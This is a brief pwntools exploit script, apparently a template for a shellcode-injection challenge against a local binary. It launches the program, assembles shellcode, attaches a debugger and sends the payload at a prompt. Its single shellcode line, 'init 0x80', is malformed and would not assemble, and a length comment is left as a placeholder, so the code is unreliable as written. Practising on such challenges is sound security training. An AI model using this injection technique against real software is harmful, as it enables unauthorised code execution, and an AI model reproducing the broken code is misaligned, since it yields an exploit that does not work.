from pwn import *
p=process("./main")
context.arch='i386'
shellcode='''
init 0x80
'''#len=xx
log.info(len(asm(shellcode)))
gdb.attach(p)
p.sendafter("shellcode>>\n",asm(shellcode).ljust(0x100))
p.interactive()
